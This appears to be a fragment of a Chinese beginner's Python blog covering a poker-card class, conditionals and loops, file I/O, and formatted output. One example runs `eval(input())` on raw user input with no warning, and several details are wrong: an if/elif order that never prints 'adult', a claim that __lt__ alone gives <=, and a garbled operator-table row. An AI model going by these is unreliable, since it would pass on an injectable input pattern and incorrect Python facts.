<h6 id="1、制作扑克"><a href="#1、制作扑克" class="headerlink" title="1、制作扑克"></a>1、制作扑克</h6><blockquote>
<p>说明：一幅扑克有52张牌（除大小王），我们需要实现随机抽取扑克牌的功能。</p>
</blockquote>
<p>使用面向对象编程方法，首先需要从问题的需求中找到对象并抽象出对应的类，此外还要找到对象的属性和行为。我们可以从需求的描述中找出名词和动词，名词通常就是对象或者是对象的属性，而动词通常是对象的行为。所以上面的说明至少有两个对象，分别为扑克和扑克牌，扑克有随机抽取的功能。一幅扑克有52张牌，扑克牌有两个属性，分别为大小跟花色，并且一幅扑克的每张牌都是这样，因此我们可以把定义一个扑克牌类，然后再定义扑克类，首先定义扑克牌类。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Card</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, rand, suit</span>):</span><br><span class="line">        self.rand = rand  <span class="comment"># 大小</span></span><br><span class="line">        self.suit = suit  <span class="comment"># 花色</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;<span class="subst">&#123;self.suit&#125;</span><span class="subst">&#123;self.rand&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">card1 = Card(<span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;黑桃&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(card1)  <span class="comment">#黑桃5</span></span><br></pre></td></tr></table></figure>

<p>接下来定义扑克类</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Poker</span>:</span><br><span class="line">    rands = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;10&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;K&#x27;</span>]</span><br><span class="line">    <span class="comment"># 黑桃，方块，梅花，红桃，并且按照从小到大排序</span></span><br><span class="line">    suits = [<span class="string">&#x27;方块&#x27;</span>, <span class="string">&#x27;梅花&#x27;</span>, <span class="string">&#x27;红桃&#x27;</span>, <span class="string">&#x27;黑桃&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 定义52张牌</span></span><br><span class="line">        self.__cards = [Card(rand, suit) <span class="keyword">for</span> rand <span class="keyword">in</span> self.rands <span class="keyword">for</span> suit <span class="keyword">in</span> self.suits]</span><br></pre></td></tr></table></figure>

<p>实现扑克具体的行为</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Poker</span>:</span><br><span class="line">    rands = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;10&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;K&#x27;</span>]</span><br><span class="line">    <span class="comment"># 黑桃，方块，梅花，红桃，并且按照从小到大排序</span></span><br><span class="line">    suits = [<span class="string">&#x27;方块&#x27;</span>, <span class="string">&#x27;梅花&#x27;</span>, <span class="string">&#x27;红桃&#x27;</span>, <span class="string">&#x27;黑桃&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 定义52张牌</span></span><br><span class="line">        self.__cards = [Card(rand, suit) <span class="keyword">for</span> rand <span class="keyword">in</span> self.rands <span class="keyword">for</span> suit <span class="keyword">in</span> self.suits]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 实现len()函数</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.__cards)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 随机抽取一张</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> random.choice(self.__cards)</span><br></pre></td></tr></table></figure>

<p>可以通过下面的代码来测试下<code>Poker</code>类。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">poker=Poker()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(poker)) <span class="comment">#52</span></span><br><span class="line"><span class="built_in">print</span>(poker.get()) <span class="comment">#红桃J</span></span><br></pre></td></tr></table></figure>

<p>上面的代码只实现了扑克的两种行为，实际上如果想实现一些扑克游戏功能，则扑克还需要更多的行为，比如发牌行为、洗牌行为等等，扑克牌类比如还需要比较大小的行为。现在为扑克牌类新增一个比较大小的函数，但是我们需要比较的是两个对象的大小，而普通的比较运算符不能直接作用于Card类型，因此我们需要对运算符进行重载，这里我们只重载&lt;符号，重载小于号用到的特殊方法是<code>__lt__</code>，上一篇博客有提到一些特殊方法，可以去看一看。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Card</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, rand, suit</span>):</span><br><span class="line">        self.rand = rand  <span class="comment"># 大小</span></span><br><span class="line">        self.suit = suit  <span class="comment"># 花色</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;<span class="subst">&#123;self.suit&#125;</span><span class="subst">&#123;self.rand&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__lt__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="comment"># 同大小的比较花色</span></span><br><span class="line">        <span class="keyword">if</span> Poker.rands.index(self.rand) == Poker.rands.index(other.rand):</span><br><span class="line">            <span class="keyword">return</span> Poker.suits.index(self.suit) &lt; Poker.suits.index(other.suit)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Poker.rands.index(self.rand) &lt; Poker.rands.index(other.rand)</span><br></pre></td></tr></table></figure>

<p>通过以下代码进行测试</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">c1=Card(<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;红桃&#x27;</span>)</span><br><span class="line">c2=Card(<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;方块&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(c1&lt;c2)  <span class="comment">#False</span></span><br><span class="line"><span class="built_in">print</span>(poker.get()&lt;poker.get())  <span class="comment">#True</span></span><br></pre></td></tr></table></figure>

<p>实际上，重载了<code>__lt__</code>方法后，实际上也可以实现大于号预算，同样的道理，如果想实现&#x3D;&#x3D;或!&#x3D;运算，只需要实现这两种特殊方法的一种即可，&lt;&#x3D;或&gt;&#x3D;也是如此。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python基础</tag>
      </tags>
  </entry>
  <entry>
    <title>分支和循环</title>
    <url>/post/e9e5e1ee.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：python基础——条件判断和循环</p>
</blockquote>
<hr>
<span id="more"></span>



<h1 id="一、条件判断"><a href="#一、条件判断" class="headerlink" title="一、条件判断"></a>一、条件判断</h1><h2 id="1、if语句"><a href="#1、if语句" class="headerlink" title="1、if语句"></a>1、if语句</h2><p>计算机之所以能做很多自动化的任务，因为它可以自己做条件判断。<br>例如：判断年龄是否为满足条件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">age = <span class="number">20</span></span><br><span class="line"><span class="keyword">if</span> age &gt;= <span class="number">18</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;your age is&#x27;</span>, age)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;adult&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>还可以用来判断真假</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> age:  <span class="comment">#此时表示age是真，特殊的真假（0为假，非0为真；&quot;&quot;为假，None为假，[]为假，（）为假，&#123;&#125;为假）</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;非0&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;为0&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="2、elif和else语句"><a href="#2、elif和else语句" class="headerlink" title="2、elif和else语句"></a>2、elif和else语句</h2><p><code>elif</code>是<code>else if</code>的缩写，完全可以有多个<code>elif</code><br>例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">age = <span class="number">20</span></span><br><span class="line"><span class="keyword">if</span> age &gt;= <span class="number">6</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;teenager&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> age &gt;= <span class="number">18</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;adult&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>当然，循环语句还可以有更多种用法，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#and（表并且）、or（或者）和not（表示不满足后面的条件），pass表示代码运行到这里就跳过</span></span><br><span class="line"><span class="keyword">if</span> age == <span class="number">21</span> <span class="keyword">and</span> name == <span class="string">&quot;z7sz&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;successed&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;pass&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> age == <span class="number">21</span> <span class="keyword">or</span> name == <span class="string">&quot;z7sz&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;1 successed&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;1 pass&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> age == <span class="number">21</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;不是21&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>



<h1 id="二、循环语句"><a href="#二、循环语句" class="headerlink" title="二、循环语句"></a>二、循环语句</h1><h2 id="1、for语句"><a href="#1、for语句" class="headerlink" title="1、for语句"></a>1、for语句</h2><p>for循环是python中很常用的一种循环方式。<br>比如我们需要计算1到100的总和：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sum</span>=<span class="number">0</span></span><br><span class="line"><span class="comment">#range()表示一个数字范围，并且包头不包尾</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line">    <span class="built_in">sum</span> += x</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure>

<p>这里注意一个函数<code>range()</code><br></p>
<ul>
<li><code>range(101)</code>：可以用来产生0到100范围的整数，需要注意的是取不到101。</li>
<li><code>range(1, 101)</code>：可以用来产生1到100范围的整数，相当于前面是闭区间后面是开区间。</li>
<li><code>range(1, 101, 2)</code>：可以用来产生1到100的奇数，其中2是步长，即每次数值递增的值。</li>
<li><code>range(100, 0, -2)</code>：可以用来产生100到1的偶数，其中-2是步长，即每次数字递减的值。</li>
</ul>
<p>利用这个函数，我们可以计算1~100之间的偶数和</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">101</span>, <span class="number">2</span>):</span><br><span class="line">    <span class="built_in">sum</span> += x</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure>



<h2 id="2、while语句"><a href="#2、while语句" class="headerlink" title="2、while语句"></a>2、while语句</h2><p>如果要构造不知道具体循环次数的循环结构，我们推荐使用<code>while</code>循环。<code>while</code>循环通过一个能够产生或转换出<code>bool</code>值的表达式来控制循环，表达式的值为<code>True</code>则继续循环；表达式的值为<code>False</code>则结束循环。</p>
<p>下面我们通过一个“猜数字”的小游戏来看看如何使用<code>while</code>循环。猜数字游戏的规则是：计算机出一个1到100之间的随机数，玩家输入自己猜的数字，计算机给出对应的提示信息（大一点、小一点或猜对了），如果玩家猜中了数字，计算机提示用户一共猜了多少次，游戏结束，否则游戏继续。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">answer = random.randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    counter += <span class="number">1</span></span><br><span class="line">    number = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入: &#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> number &lt; answer:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;大一点&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> number &gt; answer:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;小一点&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;恭喜你猜对了!&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;你总共猜了%d次&#x27;</span> % counter)</span><br></pre></td></tr></table></figure>

<p>上面的代码中使用了<code>break</code>关键字来提前终止循环，需要注意的是<code>break</code>只能终止它所在的那个循环，这一点在使用嵌套的循环结构（下面会讲到）需要引起注意。除了<code>break</code>之外，还有另一个关键字是<code>continue</code>，它可以用来放弃本次循环后续的代码直接让循环进入下一轮。</p>
<p>不管是循环还是条件判断，都必须要慎用，不合理的判断循环语句只会造成程序运行打不到预期的结果。条件判断要尽可能的简单，不要出现太多的分支结构，这只会造成程序大量的浪费资源以及执行顺序太慢，在正常的程序里头，当条件分支结构太多并且错综复杂的时候，就不应该考虑if-else的写法，而应该考虑更深层次的写法，比如责任链，当然这里肯定不讲这么深的东西；循环则是要注意循环能够退出，避免进入死循环。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python基础</tag>
      </tags>
  </entry>
  <entry>
    <title>文件读写</title>
    <url>/post/cfd577d1.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：python基础——文件读写</p>
</blockquote>
<hr>
<span id="more"></span>

<h6 id="1、打开和关闭文件"><a href="#1、打开和关闭文件" class="headerlink" title="1、打开和关闭文件"></a>1、打开和关闭文件</h6><p>在实际开发中经常会涉及到持久化的过程，即将程序运行中产生的某些数据保存到电脑上，这时就需要读写文件。在python中实现文件操作是比较简单的，我们可以使用内置的<code>open</code>函数打开文件，用<code>close</code>关闭文件。在使用<code>open</code>函数时，需要传入文件路径以及访问模式，还可以传入编码类型等信息。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment">#文件路径可以用绝对路径也可以用相对路径</span></span><br><span class="line">f.write(<span class="string">&quot;111&quot;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p>w指的是以只写的方式打开文件，除此之外还有好几种访问模式，具体看下表：</p>
<table>
<thead>
<tr>
<th>访问模式</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>r</code></td>
<td>以只读的方式打开已有文件，文件指针会显示在文件的最开头，这是默认方式，无法创建文件</td>
</tr>
<tr>
<td><code>w</code></td>
<td>以只写的方式打开文件，如果是打开已有文件，会对原有文件进行覆盖，没有文件则可以创建文件</td>
</tr>
<tr>
<td><code>a</code></td>
<td>打开文件进行追加，如果是打开已有文件，文件指针会显示在文件末尾，没有文件则可以创建文件并写入</td>
</tr>
<tr>
<td><code>b</code></td>
<td>以二进制的方式打开文件</td>
</tr>
<tr>
<td><code>+</code></td>
<td>更新（即可以读又可以写）</td>
</tr>
</tbody></table>
<p><code>b</code>和<code>+</code>需要跟其他其中模式相互配合使用，比如<code>rb</code>，<code>wb</code>等。</p>
<p>使用<code>open</code>函数打开文件成功后会返回一个文件对象，通过这个对象，我们就可以实现对文件的读写操作；如果打开文件失败，<code>open</code>函数会引发异常，稍后会对此加以说明。如果要关闭打开的文件，可以使用文件对象的<code>close</code>方法，这样可以在结束文件操作时释放掉这个文件。</p>
<h6 id="2、读写文件"><a href="#2、读写文件" class="headerlink" title="2、读写文件"></a>2、读写文件</h6><p>针对文件进行操作时，如果是只读不写，可以直接用<code>r</code>模式。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(f.read())</span><br><span class="line"><span class="built_in">print</span>(f.read(<span class="number">5</span>))  <span class="comment">#只读取5个字符</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以用for循环读出每一行数据</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">    <span class="built_in">print</span>(line, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">file.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 也可以用readlines函数读出所有数据</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">lines = file.readlines()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    <span class="built_in">print</span>(line, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>

<p>如果要向文件中写入内容，可以在打开文件时使用<code>w</code>或者<code>a</code>作为操作模式，前者会截断之前的文本内容写入新的内容，后者是在原来内容的尾部追加新的内容。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">file.write(<span class="string">&#x27;hello\tworld&#x27;</span>)</span><br><span class="line">file.write(<span class="string">&#x27;\nhello\tworld&#x27;</span>)</span><br><span class="line">file.write(<span class="string">&#x27;\nhello\tworld&#x27;</span>)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>

<h6 id="3、with函数"><a href="#3、with函数" class="headerlink" title="3、with函数"></a>3、with函数</h6><p>上面的写法每一次都要写close函数用于关闭文件，很不方便，因此我们可以用with语法来写open函数。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="string">&#x27;hello\tworld&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>这种语法叫做上下文语法。</p>
<p>针对文件的读写还有更加高级的用法，比如移动指针读写之类的，但是这种读写方式用的次数很少，这里也不多讲，毕竟我们是以基础为主。</p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python基础</tag>
      </tags>
  </entry>
  <entry>
    <title>初识python</title>
    <url>/post/d265cf47.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：python基础——初识python</p>
</blockquote>
<hr>
<span id="more"></span>



<p>前言：之前学python的时候，一直都是把笔记之类的放在本电脑上，博客创建了也有一两年，但是内容很少，说到底还是自己太懒了，没有及时的把一些内容分享出去，因此，现在打算把python基础的一系列内容搬到博客上去。</p>
<h4 id="一、初识python"><a href="#一、初识python" class="headerlink" title="一、初识python"></a>一、初识python</h4><h5 id="1-1、python版本"><a href="#1-1、python版本" class="headerlink" title="1.1、python版本"></a>1.1、python版本</h5><p>该系列是以python版本为3.9.6为前提进行学习，3.9.6版本算是版本比较高的了，没有特殊要求情况下，大家也可以跟我一样使用该版本。</p>
<h5 id="1-2、开发工具"><a href="#1-2、开发工具" class="headerlink" title="1.2、开发工具"></a>1.2、开发工具</h5><p>写代码的人都知道，一款好用的编辑器对编写代码的效率是提升很大的，我习惯用Sublime Text和VS code，这个主要看大家的习惯。</p>
<h4 id="二、python基础"><a href="#二、python基础" class="headerlink" title="二、python基础"></a>二、python基础</h4><h5 id="2-1、python关键字"><a href="#2-1、python关键字" class="headerlink" title="2.1、python关键字"></a>2.1、python关键字</h5><p>关键字：具有特殊功能的标示符，例如and，break等</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> keyword</span><br><span class="line"><span class="built_in">print</span>(keyword.kwlist)</span><br></pre></td></tr></table></figure>

<h5 id="2-2、输入和输出"><a href="#2-2、输入和输出" class="headerlink" title="2.2、输入和输出"></a>2.2、输入和输出</h5><p>输入，python3中将输入的内容当成字符串来处理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name=<span class="built_in">input</span>(<span class="string">&quot;名字：&quot;</span>)</span><br><span class="line">age=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;年龄：&quot;</span>)) <span class="comment">#将输入的内容转换为整数类型</span></span><br><span class="line">sex=<span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;代码：&quot;</span>))  <span class="comment">#将输入的内容转化为python代码来执行</span></span><br></pre></td></tr></table></figure>

<p>输出</p>
<p>%d：表示整数变量替换<br>%f：表示浮点数变量替换<br>%x：表示十六进制整数变量替换<br>%s：表示所有的类型变量替换</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="number">21</span></span><br><span class="line">c=<span class="string">&quot;z7sz&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我的年龄是%d&quot;</span>%a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我的名字是%s&quot;</span>%c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我的名字是%s,我的年龄是%d&quot;</span>%(c,a))</span><br><span class="line"><span class="comment">#还可以用字典去传值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我的名字是%(age)s&quot;</span>%&#123;<span class="string">&quot;age&quot;</span>:a&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">#对输出的数字有特殊要求时：</span></span><br><span class="line">b=<span class="number">200</span></span><br><span class="line">e=<span class="number">200.166</span></span><br><span class="line"><span class="comment">#要求输出4位数字，数字位数不足用空格表示，0表示用0填充不足的位数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我有%4d&quot;</span>%b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我有%04d&quot;</span>%b)</span><br><span class="line"><span class="comment">#要求输出的数字包含两位小数，即精确到小数点后两位,要用%f，因为%d表示整数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我有%.2f&quot;</span>%b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我有%.2f&quot;</span>%e)</span><br><span class="line"></span><br><span class="line"><span class="comment">#当输出的语句中有用到%d或者是其他类型传参数时，如果在这个语句中同时也有一个普通字符来表示%时，用%%表示</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我们的胜率为%d%%&quot;</span>%a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我们的胜率为35%&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;我们的胜率为35%%，%d&quot;</span>%a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 有时候一行语句写不完的时候，可以用\反斜杠来换行，当然，在[],(),&#123;&#125;等多行语句中，不用反斜杠，例如：</span></span><br><span class="line">total = item_one + \</span><br><span class="line">        item_two + \</span><br><span class="line">        item_three</span><br></pre></td></tr></table></figure>



<h5 id="2-3、运算符"><a href="#2-3、运算符" class="headerlink" title="2.3、运算符"></a>2.3、运算符</h5><p>Python支持多种运算符，下表大致按照优先级从高到低的顺序列出了所有的运算符，运算符的优先级指的是多个运算符同时出现时，先做什么运算然后再做什么运算。</p>
<table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td><code>[]</code> <code>[:]</code></td>
<td>下标，切片</td>
</tr>
<tr>
<td><code>**</code></td>
<td>指数</td>
</tr>
<tr>
<td><code>~</code> <code>+</code> <code>-</code></td>
<td>按位取反, 正负号</td>
</tr>
<tr>
<td><code>*</code> <code>/</code> <code>%</code> <code>//</code></td>
<td>乘，除，模，整除</td>
</tr>
<tr>
<td><code>+</code> <code>-</code></td>
<td>加，减</td>
</tr>
<tr>
<td><code>&gt;&gt;</code> <code>&lt;&lt;</code></td>
<td>右移，左移</td>
</tr>
<tr>
<td><code>&amp;</code></td>
<td>按位与</td>
</tr>
<tr>
<td><code>^</code> <code>|</code></td>
<td>按位异或，按位或</td>
</tr>
<tr>
<td><code>&lt;=</code> <code>&lt;</code> <code>&gt;</code> <code>&gt;=</code></td>
<td>小于等于，小于，大于，大于等于</td>
</tr>
<tr>
<td><code>==</code> <code>!=</code></td>
<td>等于，不等于</td>
</tr>
<tr>
<td><code>is</code>  <code>is not</code></td>
<td>身份运算符</td>
</tr>
<tr>
<td><code>in</code> <code>not in</code></td>
<td>成员运算符</td>
</tr>
<tr>
<td><code>not</code> <code>or</code> <code>and</code></td>
<td>逻辑运算符</td>
</tr>
<tr>
<td><code>=</code> <code>+=</code> <code>-=</code> <code>*=</code> <code>/=</code> <code>%=</code> <code>//=</code> <code>**=</code> <code>&amp;=</code> &#96;</td>
<td>&#x3D;<code> </code>^&#x3D;<code> </code>&gt;&gt;&#x3D;<code> </code>&lt;&lt;&#x3D;&#96;</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">赋值运算符和复合赋值运算符</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">a = <span class="number">10</span></span><br><span class="line">b = <span class="number">3</span></span><br><span class="line">a += b        <span class="comment"># 相当于：a = a + b</span></span><br><span class="line">a *= a + <span class="number">2</span>    <span class="comment"># 相当于：a = a * (a + 2)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">比较运算符和逻辑运算符的使用</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">flag0 = <span class="number">1</span> == <span class="number">1</span></span><br><span class="line">flag1 = <span class="number">3</span> &gt; <span class="number">2</span></span><br><span class="line">flag2 = <span class="number">2</span> &lt; <span class="number">1</span></span><br><span class="line">flag3 = flag1 <span class="keyword">and</span> flag2</span><br><span class="line">flag4 = flag1 <span class="keyword">or</span> flag2</span><br><span class="line">flag5 = <span class="keyword">not</span> (<span class="number">1</span> != <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag0 =&#x27;</span>, flag0)    <span class="comment"># flag0 = True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag1 =&#x27;</span>, flag1)    <span class="comment"># flag1 = True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag2 =&#x27;</span>, flag2)    <span class="comment"># flag2 = False</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag3 =&#x27;</span>, flag3)    <span class="comment"># flag3 = False</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag4 =&#x27;</span>, flag4)    <span class="comment"># flag4 = True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag5 =&#x27;</span>, flag5)    <span class="comment"># flag5 = False</span></span><br></pre></td></tr></table></figure>

<blockquote>
